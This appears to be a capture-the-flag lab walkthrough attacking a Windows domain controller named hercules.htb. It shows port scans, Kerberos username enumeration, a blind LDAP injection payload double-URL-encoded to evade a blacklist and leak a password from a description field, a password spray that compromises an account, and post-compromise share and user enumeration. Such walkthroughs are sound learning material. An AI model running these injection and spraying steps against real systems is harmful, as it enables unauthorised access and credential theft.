# Host file setup
```python
sudo nxc smb 10.129.242.196 --generate-hosts-file /etc/hosts                                         
[sudo] password for kali: 
SMB         10.129.242.196  445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
```

NTLM auth is disabled 

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn dc.hercules.htb -vv

Nmap scan report for dc.hercules.htb (10.129.242.196)
Host is up, received user-set (0.014s latency).
Scanned at 2026-09-11 17:52:34 BST for 66s
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
443/tcp   open  https            syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5986/tcp  open  wsmans           syn-ack
9389/tcp  open  adws             syn-ack
49664/tcp open  unknown          syn-ack
49668/tcp open  unknown          syn-ack
51753/tcp open  unknown          syn-ack
56289/tcp open  unknown          syn-ack
56313/tcp open  unknown          syn-ack
57888/tcp open  unknown          syn-ack
57897/tcp open  unknown          syn-ack
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT -Pn dc.hercules.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-11 17:54 +0100
Nmap scan report for dc.hercules.htb (10.129.242.196)
Host is up (0.014s latency).

PORT     STATE    SERVICE       VERSION
53/tcp   open     domain        Simple DNS Plus
80/tcp   open     http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://dc.hercules.htb/
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-11 16:55:00Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
443/tcp  open     ssl/https     Microsoft-IIS/10.0
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3269/tcp open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
5985/tcp filtered wsman
9389/tcp open     mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## System time
```python
ntpdate dc.hercules.htb
2026-09-11 17:57:45.113530 (+0100) -0.012739 +/- 0.101796 dc.hercules.htb 10.129.242.196 s1 no-leap
CLOCK: adj_systime: Operation not permitted
```

So since NTLM is disabled its worth checking what the clock skew is since ill be working with kerberos, but in this case its running at the same time as me

# Kerberos (88)
Im gong to leave kerbrute running in the background to try and enumerate some valid users

# SMB (445)

Null auth is not worth testing for here since there is no NTLM

Guest account disabled

# HTTP (80)

```python
curl -s http://hercules.htb/ -v            
* Host hercules.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.242.196
*   Trying 10.129.242.196:80...
* Established connection to hercules.htb (10.129.242.196 port 80) from 10.10.14.61 port 46348 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: hercules.htb
> User-Agent: curl/8.21.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< Content-Type: text/html; charset=UTF-8
< Location: https://hercules.htb/
< Server: Microsoft-IIS/10.0
< Date: Fri, 11 Sep 2026 17:03:19 GMT
< Content-Length: 144
< 
<head><title>Document Moved</title></head>
* Connection #0 to host hercules.htb:80 left intact
<body><h1>Object Moved</h1>This document may be found <a HREF="https://hercules.htb/">here</a></body>
```

So like nmap said, the webserver on port 80 is redirecting to the server on 443

# HTTPS (443)

There isnt a lot on the website apart from a contact page which doesnt look to be vulnerable in any way

## Feroxbuster
```python
feroxbuster -u https://hercules.htb/ -C 404 --dont-filter --insecure

200      GET       53l      162w     3213c https://hercules.htb/login
```

There are a lot of other endpoints, but most of them exist inside content and are all either framework js files or images

![](Pasted%20image%2020260911182354.png)

This is the logon portal

![](Pasted%20image%2020260911182503.png)

This kinda prevents me from fuzzing the logon portal, and anything suspicious will be flagged

![](Pasted%20image%2020260911182614.png)

Using `*:*` i get the error invalid username, i think this may be vulnerable to LDAP injection

Kerbrute found the username `auditor` and since i know this logon portal is using domain credentials i tested the creds `auditor:*` and it gave the error `login attempt failed`

# LDAP injection

Kerbrute has just found the name `will.s`

```python
kerbrute userenum --dc dc.hercules.htb -d hercules.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 30

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/14/26 - Ronnie Flathers @ropnop

2026/09/14 16:03:01 >  Using KDC(s):
2026/09/14 16:03:01 >  	dc.hercules.htb:88

2026/09/14 16:03:01 >  [+] VALID USERNAME:	admin@hercules.htb
2026/09/14 16:03:01 >  [+] VALID USERNAME:	administrator@hercules.htb
2026/09/14 16:03:01 >  [+] VALID USERNAME:	Admin@hercules.htb
2026/09/14 16:03:07 >  [+] VALID USERNAME:	Administrator@hercules.htb
2026/09/14 16:03:14 >  [+] VALID USERNAME:	auditor@hercules.htb
2026/09/14 16:03:36 >  [+] VALID USERNAME:	ADMIN@hercules.htb
2026/09/14 16:11:21 >  [+] VALID USERNAME:	will.s@hercules.htb
2026/09/14 17:06:00 >  [+] VALID USERNAME:	aDmin@hercules.htb
2026/09/14 17:06:18 >  [+] VALID USERNAME:	Will.S@hercules.htb
2026/09/14 17:12:09 >  [+] VALID USERNAME:	AUDITOR@hercules.htb
2026/09/14 17:13:44 >  Done! Tested 8295455 usernames (10 valid) in 4243.378 seconds
```

After a whole lot of testing and using errors to enumerate further i think there is a character blacklist on the LDAP injection which means i cant use chars such as `*`

But it looks like a double URL encoding works

```python
*)(description=a*
```

I will try an enumerate the description field for one of these users, i will put this into cyberchef

![](Pasted%20image%2020260914162917.png)

This is my strategy, i will double URL encode the payload to avoid the blacklist then simply just send request until i get a different error message

![](Pasted%20image%2020260914163116.png)

Using the `a` as the first character i get the error `Invalid login attempt` and also the same with `b` so this tells me this error is an invalid character

![](Pasted%20image%2020260914163242.png)

But now using `c` i get `Login attempt failed` this tells me this is a valid character, ill continue this process

Ill also ask AI to make me a list of users following the format of a user i know exists `will.s`

```python
kerbrute userenum --dc dc.hercules.htb -d hercules.htb usernames.txt -t 30

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/14/26 - Ronnie Flathers @ropnop

2026/09/14 17:21:12 >  Using KDC(s):
2026/09/14 17:21:12 >  	dc.hercules.htb:88

2026/09/14 17:21:12 >  [+] VALID USERNAME:	ashley.b@hercules.htb
2026/09/14 17:21:14 >  [+] VALID USERNAME:	elijah.m@hercules.htb
2026/09/14 17:21:14 >  [+] VALID USERNAME:	fiona.c@hercules.htb
2026/09/14 17:21:14 >  [+] VALID USERNAME:	heather.s@hercules.htb
2026/09/14 17:21:14 >  [+] VALID USERNAME:	jacob.b@hercules.htb
2026/09/14 17:21:14 >  [+] VALID USERNAME:	jennifer.a@hercules.htb
2026/09/14 17:21:15 >  [+] VALID USERNAME:	jessica.e@hercules.htb
2026/09/14 17:21:15 >  [+] VALID USERNAME:	joel.c@hercules.htb
2026/09/14 17:21:15 >  [+] VALID USERNAME:	johanna.f@hercules.htb
2026/09/14 17:21:16 >  [+] VALID USERNAME:	mark.s@hercules.htb
2026/09/14 17:21:16 >  [+] VALID USERNAME:	mikayla.a@hercules.htb
2026/09/14 17:21:16 >  [+] VALID USERNAME:	natalie.a@hercules.htb
2026/09/14 17:21:16 >  [+] VALID USERNAME:	patrick.s@hercules.htb
2026/09/14 17:21:17 >  [+] VALID USERNAME:	stephanie.w@hercules.htb
2026/09/14 17:21:17 >  [+] VALID USERNAME:	stephen.m@hercules.htb
2026/09/14 17:21:18 >  [+] VALID USERNAME:	vincent.g@hercules.htb
2026/09/14 17:21:18 >  [+] VALID USERNAME:	will.s@hercules.htb
2026/09/14 17:21:22 >  Done! Tested 13234 usernames (17 valid) in 9.970 seconds
```

Found more users!

Now i have more users its possible i have to target a specific users description field, so i can use this in my LDAP injection payload

![](Pasted%20image%2020260914174557.png)

After continuous testing of this description field i know there is a password `change*th1s_p@ssw()rd!!` but not yet sure which user its for

Ill spray this password against my current userlist, since this logon is vulnerable to LDAP injection it will use domain creds so a valid domain logon is also a valid website logon

There is no valid logons, the password could be for a user ive not discovered yet

Ill ask AI to extend this userlist further

```python
kerbrute userenum --dc dc.hercules.htb -d hercules.htb usernames_extended.txt -t 30

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/14/26 - Ronnie Flathers @ropnop

2026/09/14 17:52:54 >  Using KDC(s):
2026/09/14 17:52:54 >  	dc.hercules.htb:88

2026/09/14 17:52:55 >  [+] VALID USERNAME:	ashley.b@hercules.htb
2026/09/14 17:52:57 >  [+] VALID USERNAME:	elijah.m@hercules.htb
2026/09/14 17:52:57 >  [+] VALID USERNAME:	fiona.c@hercules.htb
2026/09/14 17:52:58 >  [+] VALID USERNAME:	heather.s@hercules.htb
2026/09/14 17:52:58 >  [+] VALID USERNAME:	jacob.b@hercules.htb
2026/09/14 17:52:58 >  [+] VALID USERNAME:	jennifer.a@hercules.htb
2026/09/14 17:52:58 >  [+] VALID USERNAME:	jessica.e@hercules.htb
2026/09/14 17:52:58 >  [+] VALID USERNAME:	joel.c@hercules.htb
2026/09/14 17:52:58 >  [+] VALID USERNAME:	johanna.f@hercules.htb
2026/09/14 17:52:59 >  [+] VALID USERNAME:	ken.w@hercules.htb
2026/09/14 17:53:00 >  [+] VALID USERNAME:	mark.s@hercules.htb
2026/09/14 17:53:00 >  [+] VALID USERNAME:	mikayla.a@hercules.htb
2026/09/14 17:53:01 >  [+] VALID USERNAME:	natalie.a@hercules.htb
2026/09/14 17:53:01 >  [+] VALID USERNAME:	patrick.s@hercules.htb
2026/09/14 17:53:01 >  [+] VALID USERNAME:	ray.n@hercules.htb
2026/09/14 17:53:01 >  [+] VALID USERNAME:	rene.s@hercules.htb
2026/09/14 17:53:03 >  [+] VALID USERNAME:	stephanie.w@hercules.htb
2026/09/14 17:53:03 >  [+] VALID USERNAME:	stephen.m@hercules.htb
2026/09/14 17:53:03 >  [+] VALID USERNAME:	tanya.r@hercules.htb
2026/09/14 17:53:03 >  [+] VALID USERNAME:	vincent.g@hercules.htb
2026/09/14 17:53:03 >  [+] VALID USERNAME:	will.s@hercules.htb
2026/09/14 17:53:05 >  Done! Tested 20170 usernames (21 valid) in 11.064 seconds
```

Found a few more users!

Ill now perform this password spray again

# Valid domain credentials and access to web portal

```python
nxc smb dc.hercules.htb -u confirmed_users.txt -p 'change*th1s_p@ssw()rd!!' -k --continue-on-success 
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\ashley.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\elijah.m:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\fiona.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\heather.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\jacob.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\jennifer.a:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\jessica.e:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\joel.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\johanna.f:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\mark.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\mikayla.a:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\natalie.a:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\patrick.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\ray.n:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\rene.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\stephanie.w:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\stephen.m:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\tanya.r:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\vincent.g:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\will.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\auditor:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\admin:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
```

I have compromised `ken.w`

```python
ken.w:change*th1s_p@ssw()rd!!
```

# Domain Enumeration as `ken.w`

## Password policy
```python
nxc smb dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --pass-pol                         
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
SMB         dc.hercules.htb 445    dc               [+] Dumping password info for domain: HERCULES
SMB         dc.hercules.htb 445    dc               Minimum password length: 7
SMB         dc.hercules.htb 445    dc               Password history length: None
SMB         dc.hercules.htb 445    dc               Maximum password age: 
SMB         dc.hercules.htb 445    dc               
SMB         dc.hercules.htb 445    dc               Password Complexity Flags: 000001
SMB         dc.hercules.htb 445    dc                   Domain Refuse Password Change: 0
SMB         dc.hercules.htb 445    dc                   Domain Password Store Cleartext: 0
SMB         dc.hercules.htb 445    dc                   Domain Password Lockout Admins: 0
SMB         dc.hercules.htb 445    dc                   Domain Password No Clear Change: 0
SMB         dc.hercules.htb 445    dc                   Domain Password No Anon Change: 0
SMB         dc.hercules.htb 445    dc                   Domain Password Complex: 1
SMB         dc.hercules.htb 445    dc               
SMB         dc.hercules.htb 445    dc               Minimum password age: None
SMB         dc.hercules.htb 445    dc               Reset Account Lockout Counter: 10 minutes 
SMB         dc.hercules.htb 445    dc               Locked Account Duration: 10 minutes 
SMB         dc.hercules.htb 445    dc               Account Lockout Threshold: None
SMB         dc.hercules.htb 445    dc               Forced Log off Time: Not Set
```

There is no lockout policy!

## Shares
```python
nxc smb dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --shares  
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
SMB         dc.hercules.htb 445    dc               [*] Enumerated shares
SMB         dc.hercules.htb 445    dc               Share           Permissions     Remark
SMB         dc.hercules.htb 445    dc               -----           -----------     ------
SMB         dc.hercules.htb 445    dc               ADMIN$                          Remote Admin
SMB         dc.hercules.htb 445    dc               C$                              Default share
SMB         dc.hercules.htb 445    dc               Department                      
SMB         dc.hercules.htb 445    dc               IPC$            READ            Remote IPC
SMB         dc.hercules.htb 445    dc               NETLOGON        READ            Logon server share 
SMB         dc.hercules.htb 445    dc               Reports                         
SMB         dc.hercules.htb 445    dc               SYSVOL          READ            Logon server share 
SMB         dc.hercules.htb 445    dc               Users           READ
```

Read access on the Users share

## Users
```python
nxc smb dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC$
jessica.e
mikayla.a
stephanie.w
johanna.f
heather.s
camilla.b
iis_administrator
taylor.m
fernando.r
james.s
anthony.r
iis_webserver$
iis_hadesapppool$
iis_apppoolidentity$
iis_defaultapppool$
auditor
vincent.g
nate.h
stephen.m
mark.s
elijah.m
angelo.o
ashley.b
clarissa.c
winda.s
rene.s
will.s
zeke.s
adriana.i
tish.c
jennifer.a
shae.j
joel.c
jacob.b
web_admin
bob.w
ken.w
johnathan.j
harris.d
ray.n
natalie.a
ramona.l
fiona.c
patrick.s
tanya.r
WINSRV01-2016$
WINSRV02-2016$
WINSRV03-2016$
ENTERPRISE01-8.1$
ENTERPRISE02-8.1$
Admin
```

I will now dump all the users in the domain!

There are also no more passwords stored in account descriptions!

Also no password reuse

There are no GPP passwords

No kerberoastable or asreproastable users

Nothing interesting in bloodhound at the moment

# Access to the hercules web portal

The credentials found will also help me get access to the web portal

![](Pasted%20image%2020260914181340.png)

The credentials also get me access to the web portal

